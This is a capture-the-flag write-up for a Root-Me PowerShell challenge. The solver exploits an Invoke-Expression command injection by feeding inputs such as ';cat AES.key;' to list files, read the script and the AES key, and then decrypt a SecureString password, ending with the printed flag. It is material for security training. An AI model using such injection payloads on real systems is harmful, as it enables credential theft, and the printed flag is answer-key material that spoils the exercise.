# Powershell Securestring

URL: https://www.root-me.org/en/Challenges/App-Script/Powershell-SecureString

## Statement

Recover the database’s password, with a twist!
## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                 |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge05.root-me.org                                                                                                                                                                                                                                                                                                               |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                   |
| Port       | 2225                                                                                                                                                                                                                                                                                                                                  |
| SSH access | [ssh -p 2225 app-script-ch19@challenge05.root-me.org](ssh://app-script-ch19:app-script-ch19@challenge05.root-me.org:2225 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_2297&ssh=ssh://app-script-ch19:app-script-ch19@challenge05 "WebSSH") |
| Username   | app-script-ch19                                                                                                                                                                                                                                                                                                                       |
| Password   | app-script-ch19                                                                                                                                                                                                                                                                                                                       |
## Solution

```bash
➜ ssh -p 2225 app-script-ch19@challenge05.root-me.org
Table to dump:
> ;ls;
Connect to the database With the secure Password: System.Security.SecureString. Backup the table

    Directory: C:\cygwin64\challenge\app-script\ch19

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/12/2021   9:25 AM             43 .git
-a----       10/29/2020   9:27 AM            361 .passwd.crypt
------       12/12/2021   9:50 AM            748 ._perms
-a----       10/29/2020   9:23 AM            176 AES.key
-a----       10/29/2020   9:30 AM            331 ch19.ps1
Table to dump:
> ;cat ch19.ps1;
$KeyFile = "AES.key"
$key = Get-Content $KeyFile
$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key

while($true){
        Write-Host "Table to dump:"
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table"
}
Table to dump:
> ;cat AES.key;
3 4 2 3 56 34 254 222 1 1 2 23 42 54 33 233 1 34 2 7 6 5 35 43 
```

[Powershell: Convert a secure string to plain text](https://stackoverflow.com/a/57431985)

```bash
> ;[System.Net.NetworkCredential]::new("", $SecurePassword).Password;
Connect to the database With the secure Password: System.Security.SecureString. Backup the table
SecureStringBypass
```

> Flag: `SecureStringBypass`

